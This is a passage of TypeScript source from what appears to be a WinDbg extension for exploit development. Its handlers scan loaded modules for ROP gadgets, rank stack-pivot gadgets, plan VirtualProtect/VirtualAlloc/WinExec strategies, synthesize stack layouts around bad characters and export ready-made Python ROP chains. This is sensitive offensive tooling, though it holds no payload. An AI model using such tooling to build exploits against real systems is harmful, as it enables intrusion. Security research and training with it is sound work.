          "Raw Accepted": disc.stats.discovered.toString(),
          Rejected: (disc.stats.scanned - disc.stats.discovered).toString(),
        };
      }),
      {
        Section: "Corpus Summary",
        Module: uniqueModuleNames,
        "Raw Accepted": "",
        Rejected: "",
        "Semantic Gadgets": currentRopCorpus.gadgets.length.toString(),
        Capabilities: capRows.length.toString(),
      },
    ]);
  };

  const executeRopScanLive = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.scan_live");
    }
    const options = isPlainObject(args[0])
      ? args[0]
      : parseScanLivePositionalArgs(args);
    const requested = Array.isArray(options.modules)
      ? options.modules
      : Array.isArray(options.module)
        ? options.module
        : [options.module];
    // "libspp,libpal" is two modules, so a call dep_plan echoes for several modules pastes as one string.
    const modules = requested
      .flatMap((module) => module === undefined ? [undefined] : String(module).split(","))
      .map((module) => module === undefined ? undefined : String(module).trim())
      .filter((module): module is string | undefined => module === undefined || module.length > 0);
    const parsedBadchars = parseHexByteList(options.badchars);
    return scanLiveCorpus(
      modules.length > 0 ? modules : [undefined],
      {
        badchars: Array.isArray(parsedBadchars) ? parsedBadchars : undefined,
        maxPerPattern: options.maxPerPattern as number | undefined,
        maxInstructionsPerGadget: options.maxInstructionsPerGadget as number | undefined,
        maxBackwardGadgets: options.maxBackwardGadgets as number | undefined,
      },
      Boolean(options.append),
    );
  };

  const executeRopScan = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.scan");
    }
    if (args.length === 0) {
      const rows = [{ Error: "rop.scan requires RP++ text input." }];
      setResult({
        command: "rop.scan",
        args: {},
        success: false,
        findings: [],
        warnings: [],
        errors: ["RP++ text input is required."],
      });
      return toDxResult("ROP Scan", rows);
    }

    if (args.length >= 1 && typeof args[0] === "string") {
      const scanBadchars = typeof args[1] === "string"
        ? parseHexByteList(args[1]) as number[] | undefined
        : undefined;
      return scanCorpus(args[0], {}, Array.isArray(scanBadchars) ? scanBadchars : undefined);
    }

    const options = isPlainObject(args[0]) ? args[0] : {};
    const text = (options.text ?? options.output ?? options.value ?? args[0]) as string | undefined;
    if (typeof text !== "string" || text.trim().length === 0) {
      const rows = [{ Error: "rop.scan requires a text property containing RP++ output." }];
      setResult({
        command: "rop.scan",
        args: options,
        success: false,
        findings: [],
        warnings: [],
        errors: ["RP++ text input is required."],
      });
      return toDxResult("ROP Scan", rows);
    }

    const parsedBadchars = parseHexByteList(options.badchars);
    return scanCorpus(text, {
      source: options.source as RPPlusProviderOptions["source"],
      provenance: options.provenance as RPPlusProviderOptions["provenance"],
      preserveEmptyLines: options.preserveEmptyLines as boolean | undefined,
    }, Array.isArray(parsedBadchars) ? parsedBadchars : undefined);
  };

  const executeCorpusExport = (...args: unknown[]): DxResult => {
    const path = typeof args[0] === "string" ? args[0] : undefined;
    if (!currentRopCorpus) {
      setResult({ command: "rop.corpus.export", args: {}, success: false, findings: [], warnings: [], errors: [NO_ROP_CORPUS_MESSAGE] });
      return toDxResult("ROP Corpus Export", [{ Error: NO_ROP_CORPUS_MESSAGE }]);
    }
    const startedAt = Date.now();
    const text = exportCorpus(currentRopCorpus, fingerprintCorpus(currentRopCorpus));
    try {
      if (path) writeProofText(path, text);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setResult({ command: "rop.corpus.export", args: path ? { path } : {}, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Export", [{ Error: "Could not write '" + (path ?? "(console)") + "': " + message }]);
    }
    const elapsedSeconds = ((Date.now() - startedAt) / 1000).toFixed(1);
    const bytes = utf8ByteLength(text);
    const rows = [{
      Status: path ? "written" : "ready",
      File: path ?? "(console)",
      Gadgets: currentRopCorpus.gadgets.length.toString(),
      Bytes: bytes.toString(),
      Elapsed: `${elapsedSeconds}s`,
    }];
    if (path) out.info(`ROP corpus export complete in ${elapsedSeconds}s (${bytes} bytes).`);
    renderRows("ROP Corpus Export", rows);
    if (!path) out.print(text + "\n");
    setResult({ command: "rop.corpus.export", args: path ? { path } : {}, success: true, findings: rows, warnings: [], errors: [] });
    return toDxResult("ROP Corpus Export", rows);
  };

  const executeCorpusReport = (...args: unknown[]): DxResult => {
    const path = typeof args[0] === "string" ? args[0] : undefined;
    const index = currentRopCorpus ?? pendingImportedCorpus?.index;
    if (!index) {
      const message = "No ROP corpus is available. Run rop.scan(...) or rop.scan_live(...) first.";
      setResult({ command: "rop.corpus.report", args: {}, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Report", [{ Error: message }]);
    }
    const importedPending = currentRopCorpus === undefined && pendingImportedCorpus !== undefined;
    const modules = importedPending
      ? pendingImportedCorpus!.fingerprint.modules.map((module) => ({ name: module.name, base: BigInt(module.base), aslr: "unknown" as const }))
      : corpusReportModules();
    const text = formatCorpusReport(index, {
      pointerSize: getPointerSize(),
      origin: importedPending ? "imported" : corpusOrigin,
      validation: importedPending ? "unverified" : corpusValidation,
      modules,
      badchars: importedPending ? undefined : corpusBadchars,
    });
    try {
      if (path) writeProofText(path, text);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setResult({ command: "rop.corpus.report", args: path ? { path } : {}, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Report", [{ Error: "Could not write '" + path + "': " + message }]);
    }
    // WinDbg can coalesce the last line of one multiline debugLog call with
    // the DxResult that follows. Emit each report line independently, then a
    // blank line, so the final gadget row is complete before dx renders.
    if (!path) {
      for (const line of text.split("\n")) out.print(line);
      out.print("");
    }
    const rows = [{ Status: path ? "written" : "printed", File: path ?? "(console)", Gadgets: index.gadgets.length.toString() }];
    if (path) renderRows("ROP Corpus Report", rows);
    setResult({
      command: "rop.corpus.report",
      args: path ? { path } : {},
      success: true,
      findings: rows,
      warnings: importedPending ? ["Imported corpus addresses are unverified."] : [],
      errors: [],
    });
    return toDxResult("ROP Corpus Report", rows);
  };

  const executeCorpusImport = (...args: unknown[]): DxResult => {
    const path = typeof args[0] === "string" ? args[0] : undefined;
    if (!path) {
      const message = "rop.corpus.import requires a JSON file path.";
      setResult({ command: "rop.corpus.import", args: {}, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Import", [{ Error: message }]);
    }
    try {
      pendingImportedCorpus = importCorpus(readText(path));
      currentRopCorpus = undefined;
      corpusOrigin = "imported";
      corpusValidation = "unverified";
      corpusBadchars = undefined;
      invalidateCorpusPlans();
      resetCorpusModules();
      const rows = [{ Status: "stale-imported", File: path, Gadgets: pendingImportedCorpus.index.gadgets.length.toString() }];
      renderRows("ROP Corpus Import", rows);
      setResult({ command: "rop.corpus.import", args: { path }, success: true, findings: rows, warnings: ["Imported corpus is inactive until validation succeeds."], errors: [] });
      return toDxResult("ROP Corpus Import", rows);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setResult({ command: "rop.corpus.import", args: { path }, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Import", [{ Error: message }]);
    }
  };

  const executeCorpusValidate = (): DxResult => {
    if (!pendingImportedCorpus) {
      const message = "No imported ROP corpus is awaiting validation.";
      setResult({ command: "rop.corpus.validate", args: {}, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("ROP Corpus Validate", [{ Error: message }]);
    }
    const result = validateCorpus(pendingImportedCorpus, fingerprintCorpus(pendingImportedCorpus.index));
    if (!result.valid) {
      const rows = [{ Status: "stale", Detail: result.reasons.join("; ") }];
      renderRows("ROP Corpus Validate", rows);
      setResult({ command: "rop.corpus.validate", args: {}, success: false, findings: [], warnings: [], errors: result.reasons });
      return toDxResult("ROP Corpus Validate", rows);
    }
    currentRopCorpus = pendingImportedCorpus.index;
    pendingImportedCorpus = undefined;
    corpusOrigin = "imported";
    corpusValidation = "sampled";
    corpusBadchars = undefined;
    invalidateCorpusPlans();
    const rows = [{ Status: "validated", Detail: "module mappings and sampled gadget bytes match" }];
    renderRows("ROP Corpus Validate", rows);
    setResult({ command: "rop.corpus.validate", args: {}, success: true, findings: rows, warnings: [], errors: [] });
    return toDxResult("ROP Corpus Validate", rows);
  };

  const executeCorpusLookup = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") return helperHelp("rop.corpus.lookup");
    const address = Number(args[0]);
    if (!Number.isFinite(address)) {
      const rows = [{ Status: "ERROR", Detail: "rop.corpus.lookup requires a numeric gadget address." }];
      renderRows("ROP Corpus Lookup", rows);
      return toDxResult("ROP Corpus Lookup", rows);
    }
    if (!currentRopCorpus) {
      const rows = [{ Status: "ERROR", Detail: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Corpus Lookup", rows);
      return toDxResult("ROP Corpus Lookup", rows);
    }
    const matches = currentRopCorpus.gadgets.filter((gadget) => gadget.locations.some((location) => location.virtualAddress === (address >>> 0)));
    if (matches.length === 0) {
      const rows = [{ Status: "NOT_FOUND", Address: hex32(BigInt(address)), Detail: "Address is not in the active corpus; lookup does not scan memory." }];
      renderRows("ROP Corpus Lookup", rows);
      return toDxResult("ROP Corpus Lookup", rows);
    }
    const rows = matches.map((gadget) => ({
      Status: "FOUND", Address: hex32(BigInt(address)), Sequence: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText).join(" ; "),
      StackDelta: formatSemanticField(gadget.semanticSummary.summary.stackDelta),
      Reads: formatSemanticField(gadget.semanticSummary.summary.reads), Writes: formatSemanticField(gadget.semanticSummary.summary.writes),
      Capabilities: gadget.capabilities.map((capability) => capability.kind).join(", "),
      Locations: gadget.locations.map((location) => location.module ?? "unknown").join(", "), Validation: corpusValidation,
    }));
    renderRows("ROP Corpus Lookup", rows);
    setResult({ command: "rop.corpus.lookup", args: { address }, success: true, findings: matches, warnings: [], errors: [] });
    return toDxResult("ROP Corpus Lookup", rows);
  };

  const executeRopQuery = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.query");
    }
    let query: RopQuery | undefined;
    let verbose = false;
    let fieldError: string | undefined;
    const listFields: Array<keyof RopQuery> = [
      "reads",
      "writes",
      "preserves",
      "preservesThroughout",
      "capability",
      "terminator",
    ];
    const scalarFields: Array<keyof RopQuery> = [
      "stackDelta",
      "memoryReads",
      "memoryWrites",
      "memoryRead",
      "memoryWrite",
      "executableOnly",
    ];
    // Common singular/short forms mapped to the canonical field name.
    const fieldAliases: Record<string, keyof RopQuery> = {
      write: "writes",
      read: "reads",
      preserve: "preserves",
      preservethroughout: "preservesThroughout",
      cap: "capability",
      capabilities: "capability",
      term: "terminator",
      stackdelta: "stackDelta",
      memorywrite: "memoryWrite",
      memoryread: "memoryRead",
    };
    if (isPlainObject(args[0])) {
      const { verbose: requestedVerbose, ...queryFields } = args[0];
      verbose = requestedVerbose === true;
      query = queryFields as RopQuery;
    } else if (typeof args[0] === "string" && args[1] !== undefined) {
      const raw = args[0].trim();
      const field = (fieldAliases[raw.toLowerCase()] ?? raw) as keyof RopQuery;
      if (listFields.includes(field)) {
        query = { [field]: [args[1]] } as RopQuery;
      } else if (scalarFields.includes(field)) {
        query = { [field]: args[1] } as RopQuery;
      } else {
        fieldError = `Unsupported field '${raw}'. Supported: ${[...listFields, ...scalarFields].join(", ")}.`;
      }
      if (query && args[2] !== undefined) {
        query.executableOnly = Boolean(args[2]);
      }
      verbose = args[3] === true;
    }
    if (!query) {
      const message = fieldError ?? "rop.query requires a supported field and value. Supported: " + [...listFields, ...scalarFields].join(", ") + ".";
      const rows = [{ Error: message }];
      renderRows("ROP Query", rows);
      setResult({
        command: "rop.query",
        args: {},
        success: false,
        findings: [],
        warnings: [],
        errors: [message],
      });
      return toDxResult("ROP Query", rows);
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Query", rows);
      setResult({
        command: "rop.query",
        args: query as Record<string, unknown>,
        success: false,
        findings: [],
        warnings: [],
        errors: [NO_ROP_CORPUS_MESSAGE],
      });
      return toDxResult("ROP Query", rows);
    }
    const queryStale = staleCorpusGuard("ROP Query", "rop.query");
    if (queryStale) return queryStale;

    const gadgets = currentRopCorpus.query(query);
    const rows = queryRows(query, verbose);
    renderRows("ROP Query", rows);
    setResult({
      command: "rop.query",
      args: { ...query as Record<string, unknown>, verbose },
      success: true,
      findings: gadgets,
      warnings: [],
      errors: [],
    });
    return toDxResult("ROP Query", rows);
  };

  const executeRopCapabilities = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.capabilities");
    }
    const rows = capabilityRows();
    renderRows("ROP Capabilities", rows);
    setResult({
      command: "rop.capabilities",
      args: {},
      success: currentRopCorpus !== undefined,
      findings: currentRopCorpus ? currentRopCorpus.gadgets : [],
      warnings: [],
      errors: currentRopCorpus ? [] : [NO_ROP_CORPUS_MESSAGE],
    });
    return toDxResult("ROP Capabilities", rows);
  };

  const executeRopPlan = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.plan");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Plan", rows);
      return toDxResult("ROP Plan", rows);
    }
    const options = isPlainObject(args[0])
      ? args[0]
      : { strategy: args[0], apiResolution: args[1] };
    const strategy = normalizeExploitStrategy(String(options.strategy ?? ""));
    if (!strategy) {
      const rows = [{ Error: "Unsupported strategy. Use VirtualProtect, VirtualAlloc, WriteProcessMemory, VirtualProtectEx, VirtualAllocEx, WinExec, or Stack Pivot." }];
      renderRows("ROP Plan", rows);
      return toDxResult("ROP Plan", rows);
    }
    const resolution = String(options.apiResolution ?? options.resolution ?? "direct").toLowerCase();
    if (resolution !== "direct" && resolution !== "iat") {
      const rows = [{ Error: "API resolution must be direct or iat." }];
      renderRows("ROP Plan", rows);
      return toDxResult("ROP Plan", rows);
    }
    const plan = planExploitStrategy(currentRopCorpus, {
      strategy,
      apiResolution: resolution as ApiResolutionMode,
    }, nextRopPlanId++);
    ropPlans.set(plan.id, { plan, generation: corpusGeneration });
    const rows = strategyPlanRows(plan);
    renderRows(`ROP Plan ${plan.id}: ${plan.strategy}`, rows);
    setResult({
      command: "rop.plan",
      args: options,
      success: plan.strategies.some((candidate) => candidate.possible),
      findings: [plan],
      warnings: [],
      errors: [],
    });
    return toDxResult(`ROP Plan ${plan.id}`, rows);
  };

  const executeRopEmit = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.emit");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Emit", rows);
      return toDxResult("ROP Emit", rows);
    }
    const emitStale = staleCorpusGuard("ROP Emit", "rop.emit");
    if (emitStale) return emitStale;
    const options = isPlainObject(args[0])
      ? args[0]
      : { planId: args[0], strategyId: args[1] };
    const planId = Number(options.planId ?? options.plan_id);
    const strategyId = options.strategyId ?? options.strategy_id;
    const entry = ropPlans.get(planId);
    if (!entry) {
      const rows = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
      renderRows("ROP Emit", rows);
      return toDxResult("ROP Emit", rows);
    }
    if (entry.generation !== corpusGeneration) {
      const rows = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
      renderRows("ROP Emit", rows);
      return toDxResult("ROP Emit", rows);
    }
    const result = ropEmitter.emit(
      currentRopCorpus,
      entry.plan,
      strategyId === undefined ? undefined : Number(strategyId),
    );
    const rows = emissionRows(result);
    renderRows(`ROP Emit ${entry.plan.id}.${result.strategyId}`, rows);
    setResult({
      command: "rop.emit",
      args: options,
      success: result.success,
      findings: [result],
      warnings: [],
      errors: result.success ? [] : result.diagnostics,
    });
    return toDxResult(`ROP Emit ${entry.plan.id}.${result.strategyId}`, rows);
  };

  const executeRopSynthesize = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.synthesize");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Synthesize", rows);
      return toDxResult("ROP Synthesize", rows);
    }
    const synthStale = staleCorpusGuard("ROP Synthesize", "rop.synthesize");
    if (synthStale) return synthStale;
    const options = isPlainObject(args[0])
      ? args[0]
      : { planId: args[0], ...(isPlainObject(args[1]) ? args[1] as Record<string, unknown> : {}) };
    const planId = Number(options.planId ?? options.plan_id ?? args[0]);
    const entry = ropPlans.get(planId);
    if (!entry) {
      const rows = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
      renderRows("ROP Synthesize", rows);
      return toDxResult("ROP Synthesize", rows);
    }
    if (entry.generation !== corpusGeneration) {
      const rows = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
      renderRows("ROP Synthesize", rows);
      return toDxResult("ROP Synthesize", rows);
    }

    let state = cachedExploitState;
    if (!state) {
      const rows = [{ Error: NO_EXPLOIT_STATE_MESSAGE }];
      renderRows("ROP Synthesize", rows);
      return toDxResult("ROP Synthesize", rows);
    }

    const overrides = isPlainObject(args[1]) ? args[1] as Record<string, unknown> : {};
    if (Object.keys(overrides).length > 0) {
      state = mergeExploitStateOverrides(state, overrides);
    }

    const result = synthesize(currentRopCorpus, entry.plan, state);
    const title = `ROP Synthesize ${planId}`;

    out.section(title);
    out.info(`Path: ${result.entryPath}`);
    out.info(`Status: ${result.status}`);
    out.info(`Layout: ${result.layoutProduced ? "produced" : "none"}`);
    out.info(`Constraint compatible: ${result.constraintCompatible ? "yes" : "no"}`);

    if (result.layoutProduced) {
      out.info(`Strategy: ${result.strategy} / ${result.shape}`);
      out.info(`Total: ${result.totalBytes} bytes`);
      if (result.placeholders.length > 0) {
        out.info(`Resolve before use: ${result.placeholders.join(", ")}`);
      }
      if (result.pivot) {
        out.info(`Pivot: ${result.pivot.sequence} (source: ${result.pivot.source}${result.pivot.sourceRegister ? ` ${result.pivot.sourceRegister}` : ""})`);
      }
    }

    for (const v of result.violations) {
      out.warn(`VIOLATION: ${v.message}`);
    }
    for (const b of result.blockers) {
      out.error(`BLOCKER: ${b.message}`);
    }
    for (const w of result.warnings) {
      out.warn(w.message);
    }

    if (!result.constraintCompatible && result.layoutProduced && result.violations.length > 0) {
      out.info("Operator action: synthesize values arithmetically, use writable memory construction, or select an alternate strategy.");
    }

    const rows = synthesisRows(result);
    renderRows(title, rows);
    setResult({
      command: "rop.synthesize",
      args: options,
      success: result.status === "complete",
      findings: [result],
      warnings: [
        ...result.violations.map((v) => v.message),
        ...result.warnings.map((w) => w.message),
      ],
      errors: result.blockers.map((b) => b.message),
    });
    return toDxResult(title, rows);
  };

  const executeRopExport = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.export");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Export", rows);
      return toDxResult("ROP Export", rows);
    }
    const exportStale = staleCorpusGuard("ROP Export", "rop.export");
    if (exportStale) return exportStale;
    const options = isPlainObject(args[0])
      ? args[0]
      : { planId: args[0], path: args[1] };
    const planId = Number(options.planId ?? options.plan_id ?? args[0]);
    const filePath = options.path ?? options.file ?? (typeof args[1] === "string" ? args[1] : undefined);
    const entry = ropPlans.get(planId);
    if (!entry) {
      const rows = [{ Error: `ROP plan ${Number.isFinite(planId) ? planId : "<invalid>"} does not exist. Run rop.plan(...) first.` }];
      renderRows("ROP Export", rows);
      return toDxResult("ROP Export", rows);
    }
    if (entry.generation !== corpusGeneration) {
      const rows = [{ Error: `ROP plan ${planId} is stale (corpus was reloaded). Run rop.plan(...) again.` }];
      renderRows("ROP Export", rows);
      return toDxResult("ROP Export", rows);
    }

    const emitResult: EmissionResult = ropEmitter.emit(currentRopCorpus, entry.plan);
    if (!emitResult.success) {
      const rows = [{ Error: `Emit failed for plan ${planId}: ${emitResult.diagnostics.join("; ")}` }];
      renderRows("ROP Export", rows);
      return toDxResult("ROP Export", rows);
    }

    const exportEmit: ExportableEmission = {
      planId: emitResult.planId,
      strategy: emitResult.strategy,
      shape: emitResult.shape,
      gadgets: emitResult.gadgets.map((g) => ({
        capability: g.capability,
        address: g.address,
        module: g.module,
        sequence: g.sequence,
      })),
    };

    let exportSynth: ExportableSynthesis | undefined;
    if (cachedExploitState) {
      const synthResult: SynthesisResult = synthesize(currentRopCorpus, entry.plan, cachedExploitState);
      if (synthResult.layoutProduced) {
        exportSynth = {
          planId: synthResult.planId,
          strategy: synthResult.strategy,
          shape: synthResult.shape,
          entryPath: synthResult.entryPath,
          status: synthResult.status,
          slots: synthResult.slots,
          placeholders: synthResult.placeholders,
          violations: synthResult.violations.map((v) => v.message),
        };
      }
    }

    const pythonLines = formatExportPython(exportEmit, exportSynth);
    const title = `ROP Export ${planId}`;

    if (typeof filePath === "string" && filePath.length > 0) {
      const hostAny = host as unknown as {
        namespace?: { Debugger?: { Utility?: { Control?: { ExecuteCommand?: (cmd: string) => unknown } } } };
      };
      const exec = hostAny.namespace?.Debugger?.Utility?.Control?.ExecuteCommand;
      if (typeof exec === "function") {
        exec(`.logopen /u "${filePath}"`);
        for (const line of pythonLines) {
          host.diagnostics.debugLog(`${line}\n`);
        }
        exec(".logclose");
        out.section(title);
        out.info(`Written to ${filePath}`);
        out.info(`${pythonLines.length} lines, ${exportEmit.gadgets.length} gadgets`);
        if (exportSynth) {
          out.info(`Includes stack layout (${exportSynth.slots.length} slots, ${exportSynth.entryPath})`);
        }
      } else {
        out.section(title);
        out.warn("File write unavailable (not running in WinDbg). Printing to console instead.");
        for (const line of pythonLines) {
          out.print(line);
        }
      }
    } else {
      out.section(title);
      for (const line of pythonLines) {
        out.print(line);
      }
    }

    const rows = [
      {
        Plan: planId.toString(),
        Strategy: `${exportEmit.strategy} / ${exportEmit.shape}`,
        Gadgets: exportEmit.gadgets.length.toString(),
        Layout: exportSynth ? `${exportSynth.slots.length} slots` : "no exploit state",
        File: typeof filePath === "string" ? filePath : "(console)",
      },
    ];
    renderRows(title, rows);
    setResult({
      command: "rop.export",
      args: options,
      success: true,
      findings: [{ python: pythonLines, emit: exportEmit, synthesis: exportSynth }],
      warnings: [],
      errors: [],
    });
    return toDxResult(title, rows);
  };

  const formatExploitStateRows = (state: ExploitState): Array<Record<string, string>> => {
    const rows: Array<Record<string, string>> = [];
    rows.push({ Section: "Control", Field: "mechanism", Value: state.control.mechanism });
    rows.push({ Section: "Control", Field: "eipControlled", Value: String(state.control.instructionPointerControlled) });
    if (state.stack.espAtControl !== undefined) {
      rows.push({ Section: "Stack", Field: "espAtControl", Value: `0x${(state.stack.espAtControl >>> 0).toString(16).toUpperCase().padStart(8, "0")}` });
    }
    rows.push({ Section: "Stack", Field: "controlledBeforeEsp", Value: state.stack.controlledBeforeEsp.toString() });
    rows.push({ Section: "Stack", Field: "controlledAfterEsp", Value: state.stack.controlledAfterEsp.toString() });
    rows.push({ Section: "Stack", Field: "contiguousControlledBytes", Value: state.stack.contiguousControlledBytes.toString() });
    rows.push({ Section: "Stack", Field: "readable", Value: String(state.stack.readable) });
    rows.push({ Section: "Stack", Field: "writable", Value: String(state.stack.writable) });
    rows.push({ Section: "Stack", Field: "executable", Value: String(state.stack.executable) });
    if (state.stack.alignment !== undefined) {
      rows.push({ Section: "Stack", Field: "alignment", Value: state.stack.alignment.toString() });
    }
    const regNames = Object.keys(state.registers);
    if (regNames.length > 0) {
      for (const reg of regNames) {
        const rs = state.registers[reg]!;
        const val = rs.kind === "constant"
          ? `constant: 0x${(rs.value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`
          : rs.kind === "pointer-into-controlled"
            ? `pointer-into-controlled: offset ${rs.offset}`
            : rs.kind;
        rows.push({ Section: "Registers", Field: reg, Value: val });
      }
    }
    const bc = state.constraints.badchars;
    if (bc.length > 0) {
      rows.push({ Section: "Constraints", Field: "badchars", Value: bc.map((b) => `0x${(b & 0xff).toString(16).toUpperCase().padStart(2, "0")}`).join(" ") });
    }
    rows.push({ Section: "Constraints", Field: "apiResolution", Value: state.constraints.apiResolution });
    if (state.constraints.maximumPayloadLength !== undefined) {
      rows.push({ Section: "Constraints", Field: "maximumPayloadLength", Value: state.constraints.maximumPayloadLength.toString() });
    }
    return rows;
  };

  const executeExploitState = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("exploit.state");
    }

    const overrides = isPlainObject(args[0]) ? args[0] as Record<string, unknown> : undefined;

    if (overrides && Object.keys(overrides).length > 0) {
      if (!cachedExploitState) {
        cachedExploitState = {
          control: {
            mechanism: "saved-ret",
            instructionPointerControlled: true,
          },
          stack: {
            controlledBeforeEsp: 0,
            controlledAfterEsp: 0,
            contiguousControlledBytes: 0,
            readable: true,
            writable: true,
            executable: false,
          },
          registers: {},
          constraints: {
            badchars: [],
            apiResolution: "either",
          },
        };
      }
      cachedExploitState = mergeExploitStateOverrides(cachedExploitState, overrides);
      out.section("Exploit State Updated");
    } else if (!cachedExploitState) {
      const rows = [{ Error: "No exploit state cached. Run triage() first, or set fields with exploit.state({...})." }];
      renderRows("Exploit State", rows);
      return toDxResult("Exploit State", rows);
    } else {
      out.section("Exploit State (cached)");
    }

    const rows = formatExploitStateRows(cachedExploitState);
    renderRows("Exploit State", rows);
    setResult({
      command: "exploit.state",
      args: overrides ?? {},
      success: true,
      findings: [cachedExploitState],
      warnings: [],
      errors: [],
    });
    return toDxResult("Exploit State", rows);
  };

  const executeExploitClear = (): DxResult => {
    cachedExploitState = undefined;
    const rows = [{ Status: "Exploit state cleared." }];
    out.section("Exploit State");
    out.info("Cached exploit state cleared.");
    renderRows("Exploit State", rows);
    return toDxResult("Exploit State", rows);
  };

  const executeRopPivots = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("rop.pivots");
    }
    if (!currentRopCorpus) {
      const rows = [{ Error: NO_ROP_CORPUS_MESSAGE }];
      renderRows("ROP Pivots", rows);
      return toDxResult("ROP Pivots", rows);
    }
    const pivotsStale = staleCorpusGuard("ROP Pivots", "rop.pivots");
    if (pivotsStale) return pivotsStale;
    const options = isPlainObject(args[0]) ? args[0] : { register: args[0], minDelta: args[1], verbose: args[2] === true };
    const filterRegister = typeof options.register === "string"
      ? options.register.toLowerCase().trim()
      : undefined;
    const minDelta = typeof options.minDelta === "number" ? options.minDelta : undefined;
    const verbose = options.verbose === true;

    const candidates = currentRopCorpus.gadgets
      .filter((g) =>
        g.capabilities.some((c) => c.kind === "STACK_PIVOT" || c.kind === "STACK_ADJUST")
        && firstKnownAddress(g) !== undefined)
      .sort((a, b) => {
        const aLen = a.instructions.length;
        const bLen = b.instructions.length;
        if (aLen !== bLen) return aLen - bLen;
        return b.score - a.score;
      });

    const rows: Array<Record<string, string>> = [];
    for (const gadget of candidates) {
      const addr = firstKnownAddress(gadget)!;
      const { source, sourceRegister, adjustment, clobbers } = classifyPivotSource(gadget);
      const seq = gadgetSequence(gadget);
      const module = gadget.locations.find((l) => l.virtualAddress !== undefined)?.module ?? "unknown";

      if (filterRegister && sourceRegister !== filterRegister) continue;
      if (minDelta !== undefined && source === "esp-adjust") {
        if (adjustment === undefined || Math.abs(adjustment) < minDelta) continue;
      }

      const addrHex = `0x${addr.toString(16).toUpperCase().padStart(8, "0")}`;
      const compact = {
        Address: addrHex,
        Sequence: seq,
        Type: source,
        Stack: gadgetStackDisplay(gadget),
        Score: gadget.score.toString(),
      };
      rows.push(verbose ? {
        ...compact,
        Source: sourceRegister ?? (adjustment !== undefined ? `ESP ${adjustment >= 0 ? "+" : ""}${adjustment}` : "indirect"),
        Clobbers: clobbers.join(", "),
        Module: module,
      } : compact);
    }

    const title = `ROP Pivots (${rows.length} found)`;
    out.section(title);
    if (rows.length === 0) {
      out.warn("No pivot gadgets found in the corpus.");
    } else {
      out.info(`${rows.length} pivot gadget(s) ranked by instruction count and score.`);
    }
    renderRows(title, rows);
    setResult({
      command: "rop.pivots",
      args: options,
      success: rows.length > 0,
      findings: rows,
      warnings: [],
      errors: [],
    });
    return toDxResult(title, rows);
  };

  const parseChainTargets = (spec: unknown): ChainTarget[] => {
    if (Array.isArray(spec)) {
      return spec
        .filter((entry) => isPlainObject(entry))
        .map((entry) => ({ register: String((entry as Record<string, unknown>).register ?? ""), value: Number((entry as Record<string, unknown>).value ?? 0) }))
        .filter((target) => target.register.length > 0);
    }
    if (isPlainObject(spec)) {
      return Object.entries(spec).map(([register, value]) => ({ register, value: Number(value) }));
    }
    return [];
  };

  const parseBadcharsOption = (value: unknown): number[] => {
    const parsed = parseHexByteList(value);
    if (!Array.isArray(parsed)) {
      return [];
    }
    return parsed.filter((entry): entry is number => Number.isInteger(entry) && entry >= 0 && entry <= 0xff);
  };

  const renderFlatFrame = (
    command: string,
    title: string,
    options: Record<string, unknown>,
    plan: FlatFramePlan,
  ): DxResult => {
    const python = formatChainPython(plan);
    out.section(title);
    out.info(`Words: ${plan.steps.length} | Stack: ${plan.stackBytes} bytes`);
    if (plan.badchars.length > 0) {
      out.info(`Badchars: ${plan.badchars.map((byte) => `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`).join(", ")}`);
    }
    for (const line of python) {
      out.print(line);
    }
    for (const warning of plan.warnings) {
      out.warn(warning);
    }

    const rows = plan.steps.map((step) => ({
      Word: step.placeholder ?? `0x${(step.value! >>> 0).toString(16).toUpperCase().padStart(8, "0")}`,
      Meaning: step.comment,
    }));
    renderRows(title, rows);
    setResult({
      command,
      args: options,
      success: plan.badcharViolations.length === 0,
      findings: [{ ...plan, python }],
